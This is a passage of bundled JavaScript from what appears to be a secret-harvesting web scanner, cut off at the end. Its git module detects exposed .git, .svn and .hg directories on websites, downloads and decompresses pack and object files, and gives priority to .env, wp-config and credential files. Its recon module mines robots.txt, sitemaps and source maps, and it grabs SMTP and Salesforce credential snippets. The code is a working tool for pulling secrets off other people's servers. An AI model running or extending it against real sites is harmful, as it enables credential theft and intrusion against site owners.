  if (buf.length < 12 || buf.subarray(0, 4).toString() !== "DIRC") return [];
  const version = buf.readUInt32BE(4);
  const count = buf.readUInt32BE(8);
  if (version !== 2 && version !== 3) return [];
  const entries = [];
  let offset = 12;
  for (let i = 0; i < count && offset + 62 < buf.length; i++) {
    const size = buf.readUInt32BE(offset + 36);
    const sha = buf.subarray(offset + 40, offset + 60).toString("hex");
    const flags = buf.readUInt16BE(offset + 60);
    const nameLen = flags & 4095;
    const nameStart = offset + 62;
    const nameEnd = nameStart + nameLen;
    if (nameEnd > buf.length) break;
    const path = buf.subarray(nameStart, nameEnd).toString("utf8");
    entries.push({ path, sha, size });
    const rawLen = 62 + nameLen + 1;
    offset += Math.ceil(rawLen / 8) * 8;
  }
  return entries;
}
function inflateFrom(buf, offset) {
  const rest = buf.subarray(offset);
  if (rest.length < 2) return null;
  let found = null;
  for (let n = 8; n <= rest.length; n = n === rest.length ? rest.length + 1 : Math.min(rest.length, n * 2)) {
    try {
      const data = inflateSync3(rest.subarray(0, n));
      found = { data, consumed: n };
      break;
    } catch {
    }
  }
  if (!found) {
    try {
      return { data: inflateSync3(rest), consumed: rest.length };
    } catch {
      return null;
    }
  }
  let lo = Math.max(2, Math.floor(found.consumed / 2));
  let hi = found.consumed;
  while (lo < hi) {
    const mid = Math.floor((lo + hi) / 2);
    try {
      const data = inflateSync3(rest.subarray(0, mid));
      found = { data, consumed: mid };
      hi = mid;
    } catch {
      lo = mid + 1;
    }
  }
  try {
    return { data: inflateSync3(rest.subarray(0, lo)), consumed: lo };
  } catch {
    return found;
  }
}
function parseGitObject(buf) {
  let inflated;
  try {
    inflated = inflateSync3(buf);
  } catch {
    const r = inflateFrom(buf, 0);
    if (!r) return null;
    inflated = r.data;
  }
  const nul = inflated.indexOf(0);
  if (nul < 0) return { type: "blob", content: inflated };
  const header = inflated.subarray(0, nul).toString("utf8");
  const type = header.split(" ")[0] ?? "blob";
  return { type, content: inflated.subarray(nul + 1) };
}
function readPackSize(buf, i) {
  let c = buf[i.p++];
  const type = c >> 4 & 7;
  let size = c & 15;
  let shift = 4;
  while (c & 128 && i.p < buf.length) {
    c = buf[i.p++];
    size |= (c & 127) << shift;
    shift += 7;
  }
  return { type, size };
}
function readOfsDelta(buf, i) {
  let c = buf[i.p++];
  let n = c & 127;
  while (c & 128 && i.p < buf.length) {
    c = buf[i.p++];
    n = n + 1 << 7 | c & 127;
  }
  return n;
}
function applyDelta(base, delta) {
  const cur = { p: 0 };
  const srcSize = readGitVarint(delta, cur);
  const dstSize = readGitVarint(delta, cur);
  void srcSize;
  const out = Buffer.alloc(dstSize);
  let o = 0;
  while (cur.p < delta.length && o < dstSize) {
    const cmd = delta[cur.p++];
    if (cmd & 128) {
      let off = 0;
      let sz = 0;
      if (cmd & 1) off |= delta[cur.p++];
      if (cmd & 2) off |= delta[cur.p++] << 8;
      if (cmd & 4) off |= delta[cur.p++] << 16;
      if (cmd & 8) off |= delta[cur.p++] << 24;
      if (cmd & 16) sz |= delta[cur.p++];
      if (cmd & 32) sz |= delta[cur.p++] << 8;
      if (cmd & 64) sz |= delta[cur.p++] << 16;
      if (sz === 0) sz = 65536;
      if (off + sz > base.length || o + sz > out.length) return null;
      base.copy(out, o, off, off + sz);
      o += sz;
    } else if (cmd !== 0) {
      if (cur.p + cmd > delta.length || o + cmd > out.length) return null;
      delta.copy(out, o, cur.p, cur.p + cmd);
      cur.p += cmd;
      o += cmd;
    } else {
      return null;
    }
  }
  return o === dstSize ? out : out.subarray(0, o);
}
function readGitVarint(buf, i) {
  let n = 0;
  let shift = 0;
  for (; ; ) {
    const c = buf[i.p++];
    n |= (c & 127) << shift;
    if (!(c & 128)) break;
    shift += 7;
  }
  return n;
}
function parsePackObjects(buf, max = 400) {
  const blobs = [];
  for (const o of parsePack(buf, max)) {
    if (o.type === 3) blobs.push(stripGitHeader(o.content));
    else if (o.type === 1 || o.type === 2 || o.type === 4) blobs.push(stripGitHeader(o.content));
    else blobs.push(o.content);
  }
  return blobs;
}
function stripGitHeader(content) {
  const nul = content.indexOf(0);
  if (nul >= 0 && nul < 64) return content.subarray(nul + 1);
  return content;
}
function parsePack(buf, max = 400) {
  if (buf.length < 12 || buf.subarray(0, 4).toString("ascii") !== "PACK") return [];
  const count = buf.readUInt32BE(8);
  const byOffset = /* @__PURE__ */ new Map();
  const bySha = /* @__PURE__ */ new Map();
  const out = [];
  let offset = 12;
  const n = Math.min(count, max);
  for (let i = 0; i < n && offset < buf.length - 20; i++) {
    const objStart = offset;
    const cur = { p: offset };
    const { type } = readPackSize(buf, cur);
    let baseOff = -1;
    let baseSha = "";
    if (type === 6) {
      baseOff = objStart - readOfsDelta(buf, cur);
    } else if (type === 7) {
      if (cur.p + 20 > buf.length) break;
      baseSha = buf.subarray(cur.p, cur.p + 20).toString("hex");
      cur.p += 20;
    }
    const inf = inflateFrom(buf, cur.p);
    if (!inf) break;
    let content = inf.data;
    let resolvedType = type;
    if (type === 6 || type === 7) {
      const base = type === 6 ? byOffset.get(baseOff)?.content : bySha.get(baseSha);
      if (base) {
        const applied = applyDelta(stripGitHeader(base), content);
        if (applied) {
          content = applied;
          resolvedType = type === 6 ? byOffset.get(baseOff)?.type ?? 3 : 3;
        }
      }
    }
    byOffset.set(objStart, { type: resolvedType, content });
    if (resolvedType >= 1 && resolvedType <= 4) {
      bySha.set(gitObjectSha(resolvedType, stripGitHeader(content)), stripGitHeader(content));
    }
    out.push({ type: resolvedType, content });
    offset = cur.p + inf.consumed;
  }
  return out;
}
function gitObjectSha(type, content) {
  const names = ["", "commit", "tree", "blob", "tag"];
  const name = names[type] ?? "blob";
  const payload = Buffer.concat([Buffer.from(`${name} ${content.length}\0`), content]);
  return createHash2("sha1").update(payload).digest("hex");
}
function gitObjectUrl(site, sha) {
  return `${site}/objects/${sha.slice(0, 2)}/${sha.slice(2)}`;
}
function priorityScore(path, hints) {
  const lower = path.toLowerCase();
  let score = 0;
  for (const h of hints) {
    if (lower.includes(h.toLowerCase())) score += 10;
  }
  if (lower.endsWith(".env") || lower.includes("wp-config") || lower.includes("credentials")) score += 20;
  return score;
}
var GIT_META_SEEDS, GIT_ROOTS, gitRefsRe, gitSHARe, gitHrefRe;
var init_git_objects = __esm({
  "packages/engine-git/src/git-objects.ts"() {
    "use strict";
    GIT_META_SEEDS = [
      "HEAD",
      "config",
      "description",
      "FETCH_HEAD",
      "ORIG_HEAD",
      "packed-refs",
      "info/refs",
      "info/exclude",
      "objects/info/packs",
      "objects/pack",
      "index",
      "logs/HEAD",
      "logs/refs/heads/master",
      "logs/refs/heads/main",
      "logs/refs/remotes/origin/HEAD",
      "logs/refs/remotes/origin/master",
      "logs/refs/remotes/origin/main",
      "refs/heads/master",
      "refs/heads/main",
      "refs/heads/develop",
      "refs/heads/dev",
      "refs/heads/staging",
      "refs/heads/production",
      "refs/heads/release",
      "refs/stash",
      "COMMIT_EDITMSG",
      "refs/remotes/origin/HEAD",
      "refs/remotes/origin/master",
      "refs/remotes/origin/main",
      "logs/refs/heads/develop",
      "logs/refs/heads/dev",
      "logs/refs/heads/staging",
      "logs/refs/stash"
    ];
    GIT_ROOTS = [
      "/.git",
      "/backup/.git",
      "/old/.git",
      "/html/.git",
      "/public/.git",
      "/www.git",
      "/.git.bak"
    ];
    gitRefsRe = /refs\/(?:heads|remotes|tags)\/[\w\-./]+/g;
    gitSHARe = /\b[a-f0-9]{40}\b/g;
    gitHrefRe = /href=["']([^"']+)["']/gi;
  }
});

// packages/engine-git/src/vcs-extra.ts
async function* scanSvnHg(deps, ctx) {
  yield* scanSvn(deps, ctx);
  if (ctx.signal.aborted) return;
  yield* scanHg(deps, ctx);
}
async function* scanSvn(deps, ctx) {
  const base = `${ctx.origin}/.svn`;
  if (!deps.dedup.checkAndMark("svn-site", base)) return;
  const entries = await getText(deps, ctx, `${base}/entries`);
  const wc = await getBuf(deps, ctx, `${base}/wc.db`);
  const fmt = await getText(deps, ctx, `${base}/format`);
  const exposed = entries && /dir|svn:|dirent/i.test(entries) && !deps.analyzer.isWAFPage(entries) || fmt && /^\d/.test(fmt.trim()) && !deps.analyzer.isWAFPage(fmt) || wc && wc.length > 64 && wc.subarray(0, 16).toString("utf8").includes("SQLite");
  if (!exposed) return;
  deps.logger.info("SVN", `exposed ${base}`);
  const hitEntries = analyzeContent(deps, ctx, `${base}/entries`, entries ?? "");
  if (hitEntries) yield hitEntries;
  if (wc) {
    const hitWc = analyzeContent(deps, ctx, `${base}/wc.db`, wc);
    if (hitWc) yield hitWc;
  }
  let n = 0;
  for (const name of SVN_TEXTBASE) {
    if (n >= EXTRA_FILE_CAP || ctx.signal.aborted) break;
    const hit = await fetchAnalyze(deps, ctx, `${base}/text-base/${name}.svn-base`);
    if (hit) {
      n++;
      yield hit;
    }
  }
}
async function* scanHg(deps, ctx) {
  const base = `${ctx.origin}/.hg`;
  if (!deps.dedup.checkAndMark("hg-site", base)) return;
  const hgrc = await getText(deps, ctx, `${base}/hgrc`);
  const req = await getText(deps, ctx, `${base}/requires`);
  const exposed = hgrc && /\[(?:paths|ui|auth)\]|revlog/i.test(hgrc) && !deps.analyzer.isWAFPage(hgrc) || req && /revlog|store|fncache/i.test(req) && !deps.analyzer.isWAFPage(req);
  if (!exposed) return;
  deps.logger.info("HG", `exposed ${base}`);
  const seeds = /* @__PURE__ */ new Map();
  if (hgrc) seeds.set(`${base}/hgrc`, hgrc);
  if (req) seeds.set(`${base}/requires`, req);
  for (const s of HG_SEEDS) {
    if (seeds.has(`${base}/${s}`)) continue;
    const text = await getText(deps, ctx, `${base}/${s}`);
    if (text) seeds.set(`${base}/${s}`, text);
  }
  let n = 0;
  for (const [url, text] of seeds) {
    if (n >= EXTRA_FILE_CAP || ctx.signal.aborted) break;
    const hit = analyzeContent(deps, ctx, url, text);
    if (hit) {
      n++;
      yield hit;
    }
  }
}
function analyzeContent(deps, ctx, url, content) {
  if (!content || typeof content === "string" && !content) return null;
  const path = safePath(url);
  const analyzed = deps.analyzer.analyze({ url, path, content });
  if (analyzed.rejected || !analyzed.matches.length) return null;
  return {
    source: "git",
    url: ctx.rawUrl,
    origin: ctx.origin,
    path,
    blobPath: path,
    matches: analyzed.matches,
    contentSnippet: analyzed.text.slice(0, 1500)
  };
}
async function fetchAnalyze(deps, ctx, url) {
  try {
    const res = await deps.http.get(url, { signal: ctx.signal, budget: "pathProbe" });
    if (res.status !== 200) return null;
    if (deps.analyzer.isWAFPage(res.text)) return null;
    return analyzeContent(deps, ctx, url, res.body.length ? res.body : res.text);
  } catch {
    return null;
  }
}
async function getText(deps, ctx, url) {
  try {
    const res = await deps.http.get(url, { signal: ctx.signal, budget: "pathProbe" });
    if (res.status !== 200 || !res.text) return null;
    return res.text;
  } catch {
    return null;
  }
}
async function getBuf(deps, ctx, url) {
  try {
    const res = await deps.http.get(url, { signal: ctx.signal, budget: "pathProbe", keepBody: true, maxBytes: 512 * 1024 });
    if (res.status !== 200) return null;
    if (res.body?.length) return res.body;
    if (res.text) return Buffer.from(res.text);
    return null;
  } catch {
    return null;
  }
}
function safePath(url) {
  try {
    return new URL(url).pathname;
  } catch {
    return url;
  }
}
var SVN_TEXTBASE, HG_SEEDS, EXTRA_FILE_CAP;
var init_vcs_extra = __esm({
  "packages/engine-git/src/vcs-extra.ts"() {
    "use strict";
    SVN_TEXTBASE = [
      ".env",
      ".env.local",
      ".env.production",
      "wp-config.php",
      "config.php",
      "settings.py",
      "web.config",
      "application.properties",
      "credentials.json",
      "secrets.yml",
      "config.json",
      "docker-compose.yml"
    ];
    HG_SEEDS = ["hgrc", "requires", "branch", "last-message.txt"];
    EXTRA_FILE_CAP = 24;
  }
});

// packages/engine-git/src/index.ts
var src_exports3 = {};
__export(src_exports3, {
  GitModule: () => GitModule,
  default: () => src_default3,
  parseGitIndex: () => parseGitIndex,
  parseGitObject: () => parseGitObject,
  snippetAroundMatches: () => snippetAroundMatches
});
function snippetAroundMatches(text, matches) {
  const cap = 48e3;
  if (!text) return "";
  if (text.length <= cap) return text;
  const windows = [];
  const add = (i, before, after) => {
    if (i < 0) return;
    windows.push([Math.max(0, i - before), Math.min(text.length, i + after)]);
  };
  for (const m of matches) {
    if (!m.value || m.value.length < 4) continue;
    const i = text.indexOf(m.value);
    if (i < 0) continue;
    const smtpish = /smtp|mail|from|salesforce/i.test(`${m.service} ${m.patternName}`);
    add(i, smtpish ? 800 : 200, smtpish ? 4e3 : 200);
  }
  const mailMark = /(?:MAIL_|SMTP_|EMAIL_HOST|DEFAULT_FROM_EMAIL|SENDER_EMAIL|WP_MAIL_FROM|FROM_EMAIL|FROM_ADDRESS|NOREPLY_EMAIL|SALESFORCE_|SFDC_|SF_USERNAME|SF_PASSWORD|SF_SESSION)/gi;
  let mm;
  let n = 0;
  while ((mm = mailMark.exec(text)) && n < 80) {
    add(mm.index, 200, 600);
    n++;
  }
  if (!windows.length) return text.slice(0, 1500);
  windows.sort((a, b2) => a[0] - b2[0]);
  const merged = [];
  for (const w of windows) {
    const last = merged[merged.length - 1];
    if (last && w[0] <= last[1] + 80) last[1] = Math.max(last[1], w[1]);
    else merged.push([w[0], w[1]]);
  }
  let out = "";
  for (const [a, b2] of merged) {
    if (out.length >= cap) break;
    const chunk = text.slice(a, Math.min(b2, a + (cap - out.length)));
    out += out ? `
${chunk}` : chunk;
  }
  return out;
}
function skipShaExtract(path) {
  return /(?:^index$|\.pack$|\.idx$|objects\/info\/packs$)/i.test(path);
}
function resolveGitRel(current, href) {
  if (/^https?:/i.test(href)) return null;
  const dir = current.includes("/") ? current.slice(0, current.lastIndexOf("/") + 1) : "";
  let next = href.replace(/^\.\//, "");
  if (next.startsWith("/")) {
    const idx = next.indexOf(".git/");
    next = idx >= 0 ? next.slice(idx + 5) : next.replace(/^\/+/, "");
  } else {
    next = (dir + next).replace(/\/+/g, "/");
  }
  if (next.includes("..")) return null;
  return next.replace(/^\/+/, "");
}
var LIST_DIR_CAP, GitModule, src_default3;
var init_src5 = __esm({
  "packages/engine-git/src/index.ts"() {
    "use strict";
    init_git_objects();
    init_vcs_extra();
    LIST_DIR_CAP = 24;
    GitModule = class {
      name = "git";
      phase = "pre";
      requiresPage = false;
      constructor(deps) {
        this.http = deps.http;
        this.analyzer = deps.analyzer;
        this.config = deps.config;
        this.dedup = deps.dedup;
        this.logger = deps.logger;
      }
      http;
      analyzer;
      config;
      dedup;
      logger;
      isEnabled(config) {
        return config.modules.git !== false;
      }
      async *scan(ctx) {
        for (const root of GIT_ROOTS) {
          if (ctx.signal.aborted) break;
          yield* this.scanDump(ctx, `${ctx.origin}${root}`);
        }
        if (!ctx.signal.aborted) {
          yield* scanSvnHg(
            {
              http: this.http,
              analyzer: this.analyzer,
              config: this.config,
              dedup: this.dedup,
              logger: this.logger
            },
            ctx
          );
        }
      }
      async *scanDump(ctx, site) {
        if (!this.dedup.checkAndMark("git-site", site)) return;
        let finished = false;
        try {
          const exposed = await this.detect(site, ctx);
          if (ctx.signal.aborted) return;
          if (!exposed) {
            finished = true;
            return;
          }
          this.logger.info("GIT", `exposed ${site}`);
          yield* this.reconstruct(site, ctx);
          finished = !ctx.signal.aborted;
        } finally {
          if (!finished) this.dedup.unmark?.("git-site", site);
        }
      }
      async detect(site, ctx) {
        const probes = ["HEAD", "config", ""];
        const hits = await Promise.all(
          probes.map(async (p) => {
            const res = await this.safeGet(p ? `${site}/${p}` : `${site}/`, ctx);
            if (!res) return false;
            if (this.analyzer.isWAFPage(res.text)) return false;
            const label = p ? `${site}/${p}` : `${site}/`;
            if (gitLooksExposed(label, res.text) || p === "HEAD" && gitLooksExposed("/HEAD", res.text)) {
              return true;
            }
            return p === "" && (res.text.includes("HEAD") || res.text.includes("config"));
          })
        );
        return hits.some(Boolean);
      }
      async *reconstruct(site, ctx) {
        const cfg = this.config.get();
        const hints = cfg.gitSecretHints;
        const maxBlobs = cfg.concurrency.gitMaxBlobs;
        const maxDownloads = Math.max(64, cfg.concurrency.gitMaxDownloads ?? 400);
        const workers = Math.max(1, cfg.concurrency.gitWorkers);
        const fetched = /* @__PURE__ */ new Map();
        const processed = /* @__PURE__ */ new Set();
        const packNames = /* @__PURE__ */ new Set();
        await this.fetchMany(site, ctx, [...GIT_META_SEEDS], fetched, processed, packNames, workers, maxDownloads);
        const listed = [];
        let listDirs = 0;
        for (const [path, file] of fetched) {
          if (!this.looksHtml(file.text) || listDirs >= LIST_DIR_CAP) continue;
          listDirs++;
          for (const href of extractGitHrefs(file.text)) {
            const next = resolveGitRel(path, href);
            if (next && !processed.has(next)) listed.push(next);
          }
        }
        await this.fetchMany(site, ctx, listed, fetched, processed, packNames, workers, maxDownloads);
        const extraRefs = [];
        for (const file of fetched.values()) {
          for (const ref of extractGitRefs(file.text)) {
            if (!processed.has(ref)) extraRefs.push(ref);
          }
        }
        await this.fetchMany(site, ctx, extraRefs, fetched, processed, packNames, workers, maxDownloads);
        for (const [path, file] of fetched) {
          const named = path.match(/pack-([a-f0-9]{40})\.pack$/i);
          if (named) packNames.add(named[1].toLowerCase());
          for (const listed2 of file.text.matchAll(/pack-([a-f0-9]{40})\.pack/gi)) {
            packNames.add(listed2[1].toLowerCase());
          }
        }
        const index = fetched.get("index");
        const indexEntries = index ? parseGitIndex(index.body) : [];
        const hasPacks = packNames.size > 0;
        const hasIndex = indexEntries.length > 0;
        if (!hasIndex && !hasPacks) {
          const loose = [];
          for (const [path, file] of fetched) {
            if (skipShaExtract(path)) continue;
            let added = 0;
            for (const sha of extractShas(file.text)) {
              if (!isValidSha(sha) || added >= 75) continue;
              const obj = `objects/${sha.slice(0, 2)}/${sha.slice(2)}`;
              if (processed.has(obj)) continue;
              loose.push(obj);
              added++;
            }
          }
          await this.fetchMany(site, ctx, loose, fetched, processed, packNames, workers, Math.min(maxDownloads, 80));
        }
        const blobHits = [];
        if (hasIndex && !hasPacks) {
          const toFetch = [...indexEntries].sort((a, b2) => priorityScore(b2.path, hints) - priorityScore(a.path, hints)).slice(0, maxBlobs);
          let bi = 0;
          const run = async () => {
            while (bi < toFetch.length && !ctx.signal.aborted) {
              const e = toFetch[bi++];
              const obj = await this.safeGet(gitObjectUrl(site, e.sha), ctx);
              if (!obj) continue;
              const parsed = parseGitObject(obj.body);
              const content = parsed?.content ?? obj.body;
              const hit = this.analyzeBuf(ctx, site, e.path, content);
              if (hit) blobHits.push(hit);
            }
          };
          await Promise.all(Array.from({ length: workers }, () => run()));
        }
        const packShas = [...packNames].slice(0, 8);
        let pi = 0;
        const packRun = async () => {
          while (pi < packShas.length && !ctx.signal.aborted) {
            const sha = packShas[pi++];
            const pack = await this.safeGet(`${site}/objects/pack/pack-${sha}.pack`, ctx, 12 * 1024 * 1024);
            if (!pack) continue;
            this.logger.info("GIT", `pack ${sha.slice(0, 8)}\u2026 on ${site}`);
            for (const blob2 of parsePackObjects(pack.body, maxBlobs)) {
              const hit = this.analyzeBuf(ctx, site, `pack-${sha}`, blob2);
              if (hit) blobHits.push(hit);
            }
          }
        };
        await Promise.all(Array.from({ length: Math.min(2, workers) }, () => packRun()));
        for (const [path, file] of fetched) {
          if (path.endsWith(".pack") || path.endsWith(".idx")) continue;
          let body = file.body.length ? file.body : file.text;
          if (path.includes("objects/") && !path.includes("info/") && file.body.length) {
            const parsed = parseGitObject(file.body);
            if (parsed) body = parsed.content;
          }
          const hit = this.analyzeBuf(ctx, site, path, body);
          if (hit) yield hit;
        }
        for (const h of blobHits) yield h;
      }
      async fetchMany(site, ctx, items, fetched, processed, packNames, workers, cap) {
        const queue = items.map((rel) => rel.replace(/^\/+/, "").replace(/^\.git\//, "")).filter((norm) => {
          if (!norm || processed.has(norm)) return false;
          const listedPack = norm.match(/pack-([a-f0-9]{40})\.pack$/i);
          if (listedPack) {
            packNames.add(listedPack[1].toLowerCase());
            processed.add(norm);
            return false;
          }
          if (/\.idx$/i.test(norm)) {
            processed.add(norm);
            return false;
          }
          processed.add(norm);
          return true;
        });
        let i = 0;
        const run = async () => {
          while (i < queue.length && fetched.size < cap && !ctx.signal.aborted) {
            const norm = queue[i++];
            const res = await this.safeGet(`${site}/${norm}`, ctx);
            if (!res) continue;
            fetched.set(norm, { body: res.body, text: res.text });
          }
        };
        await Promise.all(Array.from({ length: Math.max(1, workers) }, () => run()));
      }
      analyzeBuf(ctx, site, path, content) {
        const analyzed = this.analyzer.analyze({ url: site, path, content });
        if (analyzed.rejected || !analyzed.matches.length) return null;
        return {
          source: "git",
          url: ctx.rawUrl,
          origin: ctx.origin,
          site,
          blobPath: path,
          matches: analyzed.matches,
          contentSnippet: snippetAroundMatches(analyzed.text, analyzed.matches)
        };
      }
      looksHtml(text) {
        const head = text.slice(0, 200).toLowerCase();
        return head.includes("<html") || head.includes("<!doctype") || head.includes("href=");
      }
      async safeGet(url, ctx, maxBytes) {
        const isPack = /pack-[a-f0-9]{40}\.pack$/i.test(url);
        const isGitObj = /\/objects\/[a-f0-9]{2}\/[a-f0-9]{38}$/i.test(url);
        const isIndex = /\/index$/i.test(url);
        const keepBody = isPack || isGitObj || isIndex;
        try {
          const res = await this.http.get(url, {
            signal: ctx.signal,
            budget: isPack ? "gitDump" : "pathProbe",
            maxBytes: maxBytes ?? (isPack ? 8 * 1024 * 1024 : keepBody ? 512 * 1024 : 128 * 1024),
            keepBody
          });
          if (res.status !== 200 || res.body.length === 0 && !res.text) return null;
          if (this.analyzer.isWAFPage(res.text)) return null;
          return res;
        } catch {
          return null;
        }
      }
    };
    src_default3 = GitModule;
  }
});

// packages/engine-recon/src/index.ts
var src_exports4 = {};
__export(src_exports4, {
  ReconModule: () => ReconModule,
  default: () => src_default4
});
function matchAll2(re, text) {
  const out = [];
  const g = new RegExp(re.source, re.flags);
  let m;
  while (m = g.exec(text)) out.push(m[1]);
  return out;
}
function reconScore(url) {
  const u = url.toLowerCase();
  let s = 0;
  for (const h of [".env", "config", "backup", "secret", "admin", "/api/", ".json", ".xml", ".php", ".git", "wp-config", "credentials"]) {
    if (u.includes(h)) s += 10;
  }
  return s;
}
var ROBOTS_PATH, ROBOTS_SITEMAP, SITEMAP_LOC, MAX_ROBOTS_PATHS, MAX_SITEMAP_URLS, MAX_SITEMAPS, RECON_FETCH, SKIP_EXT, ReconModule, src_default4;
var init_src6 = __esm({
  "packages/engine-recon/src/index.ts"() {
    "use strict";
    init_src();
    init_src2();
    ROBOTS_PATH = /(?:Disallow|Allow):\s*(\S+)/gi;
    ROBOTS_SITEMAP = /Sitemap:\s*(\S+)/gi;
    SITEMAP_LOC = /<loc>\s*(https?:\/\/[^<\s]+)\s*<\/loc>/gi;
    MAX_ROBOTS_PATHS = 40;
    MAX_SITEMAP_URLS = 24;
    MAX_SITEMAPS = 3;
    RECON_FETCH = 8;
    SKIP_EXT = /\.(?:png|jpe?g|gif|webp|svg|ico|woff2?|ttf|eot|css|mp4|mp3|pdf)$/i;
    ReconModule = class {
      name = "recon";
      phase = "content";
      requiresPage = true;
      constructor(deps) {
        this.http = deps.http;
        this.analyzer = deps.analyzer;
        this.config = deps.config;
        this.dedup = deps.dedup;
        this.logger = deps.logger;
        this.compiled = compilePatternSets(deps.config.patterns());
      }
      http;
      analyzer;
      config;
      dedup;
      logger;
      compiled;
      isEnabled(config) {
        return config.modules.recon !== false;
      }
      async *scan(ctx) {
        if (!ctx.pageContent) return;
        const compiled = this.compiled;
        const payloads = this.analyzer.extractJSONPayloads(ctx.pageContent);
        for (const p of payloads) {
          const analyzed = this.analyzer.analyze({ url: ctx.rawUrl, content: p.raw });
          if (analyzed.rejected || !analyzed.matches.length) continue;
          this.logger.info("RECON", `SSR ${p.name} on ${ctx.origin}`);
          yield {
            source: "recon",
            url: ctx.rawUrl,
            origin: ctx.origin,
            payloadType: p.name,
            matches: analyzed.matches
          };
        }
        const scripts = applyDiscovery(ctx.pageContent, compiled, "scriptSrc").slice(0, 5);
        for (const src of scripts) {
          const abs = resolveUrl(ctx.origin + "/", src);
          if (!abs) continue;
          const mapUrl = abs.replace(/(\.mjs|\.cjs|\.js)(\?.*)?$/i, "$1.map");
          if (mapUrl === abs) continue;
          const mapHit = await this.fetchAndScan(ctx, mapUrl, "sourcemap");
          if (mapHit) {
            mapHit.mapUrl = mapUrl;
            yield mapHit;
          }
        }
        if (this.dedup.checkAndMark("recon-origin", ctx.origin)) {
          yield* this.guidanceAndRescan(ctx, compiled);
        }
      }
      async *guidanceAndRescan(ctx, compiled) {
        const endpoints = [];
        const sitemaps = [];
        try {
          const robots = await this.http.get(`${ctx.origin}/robots.txt`, { signal: ctx.signal, budget: "pathProbe" });
          if (robots.status === 200 && robots.text.trim()[0] !== "<" && !this.analyzer.isWAFPage(robots.text)) {
            const analyzed = this.analyzer.analyze({ url: `${ctx.origin}/robots.txt`, path: "/robots.txt", content: robots.text });
            if (!analyzed.rejected && analyzed.matches.length) {
              yield {
                source: "recon",
                url: ctx.rawUrl,
                origin: ctx.origin,
                path: "/robots.txt",
                payloadType: "robots.txt",
                matches: analyzed.matches
              };
            }
            for (const p of [...applyDiscovery(robots.text, compiled, "robotsDisallow"), ...matchAll2(ROBOTS_PATH, robots.text)]) {
              if (!p || p === "/" || p.includes("*")) continue;
              const abs = resolveUrl(ctx.origin + "/", p);
              if (abs && sameHost(abs, ctx.origin) && !SKIP_EXT.test(abs)) endpoints.push(abs);
            }
            for (const sm of [...applyDiscovery(robots.text, compiled, "robotsSitemap"), ...matchAll2(ROBOTS_SITEMAP, robots.text)]) {
              if (!sm || sitemaps.length >= MAX_SITEMAPS) continue;
              const abs = sm.startsWith("http") ? sm : resolveUrl(ctx.origin + "/", sm);
              if (abs && sameHost(abs, ctx.origin)) sitemaps.push(abs);
            }
          }
        } catch {
        }
        if (!sitemaps.length) sitemaps.push(`${ctx.origin}/sitemap.xml`);
        for (const smURL of sitemaps.slice(0, MAX_SITEMAPS)) {
          if (ctx.signal.aborted) break;
          try {
            const sm = await this.http.get(smURL, { signal: ctx.signal, budget: "pathProbe" });
            if (sm.status !== 200 || this.analyzer.isWAFPage(sm.text)) continue;
            const analyzed = this.analyzer.analyze({ url: smURL, path: "/sitemap.xml", content: sm.text });
            if (!analyzed.rejected && analyzed.matches.length) {
              yield {
                source: "recon",
                url: ctx.rawUrl,
                origin: ctx.origin,
                path: "/sitemap.xml",
                payloadType: "sitemap.xml",
                matches: analyzed.matches
              };
            }
            let locs = 0;
            for (const loc of [...applyDiscovery(sm.text, compiled, "sitemapLoc"), ...matchAll2(SITEMAP_LOC, sm.text)]) {
              if (locs >= MAX_SITEMAP_URLS) break;
              const abs = loc.startsWith("http") ? loc : resolveUrl(ctx.origin + "/", loc);
              if (!abs || !sameHost(abs, ctx.origin) || SKIP_EXT.test(abs)) continue;
              endpoints.push(abs);
              locs++;
            }
          } catch {
          }
        }
        const unique = [...new Set(endpoints)].slice(0, MAX_ROBOTS_PATHS + MAX_SITEMAP_URLS);
        const interesting = unique.sort((a, b2) => reconScore(b2) - reconScore(a));
        this.logger.info("RECON", `${interesting.length} endpoint(s) to re-scan on ${ctx.origin}`);
        let i = 0;
        const hits = [];
        const workers = Array.from({ length: Math.min(RECON_FETCH, interesting.length || 1) }, async () => {
          while (i < interesting.length && !ctx.signal.aborted) {
            const url = interesting[i++];
            if (!this.dedup.checkAndMark("recon-ep", url)) continue;
            const hit = await this.fetchAndScan(ctx, url, "recon");
            if (hit) {
              hit.path = new URL(url).pathname;
              hit.payloadType = "guidance-rescan";
              hits.push(hit);
            }
          }
        });
        await Promise.all(workers);
        for (const h of hits) yield h;
      }
      async fetchAndScan(ctx, url, source) {
        if (source === "sourcemap" && !this.dedup.checkAndMark("map", url)) return null;
        try {
          const res = await this.http.get(url, { signal: ctx.signal, budget: "pathProbe" });
          if (res.status !== 200 && res.status !== 201 && res.status !== 401 && res.status !== 403) return null;
          if (this.analyzer.isWAFPage(res.text)) return null;
          if (source === "sourcemap") {
            if (res.text.trim()[0] !== "{") return null;
            const sources = this.analyzer.parseSourceMapV3(res.text);
            const matches = [];
            for (const s of sources) {
              const a = this.analyzer.analyze({ content: s.content, path: s.file, url });
              if (!a.rejected) matches.push(...a.matches);
            }
            if (!matches.length) return null;
            return { source, url: ctx.rawUrl, origin: ctx.origin, mapUrl: url, matches };
          }
          if (!this.analyzer.isLikelySecretFile(res.text, url) && this.analyzer.isHTML(res.text) && reconScore(url) < 5) {
            const a = this.analyzer.analyze({ url, content: res.text });
            if (a.rejected || !a.matches.length) return null;
            return { source, url: ctx.rawUrl, origin: ctx.origin, matches: a.matches, statusCode: res.status };
          }
          const analyzed = this.analyzer.analyze({ url, path: new URL(url).pathname, content: res.text });
          if (analyzed.rejected || !analyzed.matches.length) return null;
          return {
            source,
            url: ctx.rawUrl,
            origin: ctx.origin,
            matches: analyzed.matches,
            statusCode: res.status,
            contentSnippet: analyzed.text.slice(0, 200)
          };
        } catch {
          return null;
        }
      }
    };
    src_default4 = ReconModule;
  }
});

// packages/engine-vuln/src/index.ts
var src_exports5 = {};
__export(src_exports5, {
  VulnModule: () => VulnModule,
  default: () => src_default5,
  nextJsEvidence: () => nextJsEvidence
});
function nextJsEvidence(html) {
  if (!html) return [];
  const head = html.slice(0, 2e5);
  return NEXT_MARKERS.filter((m) => m.re.test(head)).map((m) => m.name);
}
var NEXT_MARKERS, VulnModule, src_default5;
var init_src7 = __esm({
  "packages/engine-vuln/src/index.ts"() {
    "use strict";
    init_src();
    NEXT_MARKERS = [
      { name: "__NEXT_DATA__", re: /__NEXT_DATA__/ },
      { name: "next/static", re: /\/_next\/static\// },
      { name: "__next_f", re: /(?:__next_f\.push|self\.__next_f)\s*\(/ },
      { name: "next-router", re: /data-next-router/ },
